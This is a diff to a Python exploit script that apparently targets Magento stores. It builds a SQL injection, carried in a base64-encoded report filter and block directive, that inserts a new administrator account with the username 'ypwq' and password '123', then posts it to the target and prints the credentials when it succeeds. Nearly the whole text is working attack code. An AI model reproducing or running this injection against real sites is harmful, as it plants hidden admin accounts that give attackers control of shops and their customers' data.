@@ -21,13 +21,18 @@ INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,
 INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
 """
 
+# Put the nice readable queries into one line,
+# and insert the username:password combinination
 query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
-
 pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
+
+# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
 r = requests.post(target_url, 
-                  data={"___directive": base64.b64encode("{{block type=Adminhtml/report_search_grid output=getCsvFile}}"),
-                                    "filter": base64.b64encode(pfilter),
-                                    "forwarded": 1})
+                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
+                        "filter": base64.b64encode(pfilter),
+                        "forwarded": 1})
 if r.ok:
     print "WORKED"
     print "Check {0}/admin with creds ypwq:123".format(target)
+else:
+    print "DID NOT WORK"
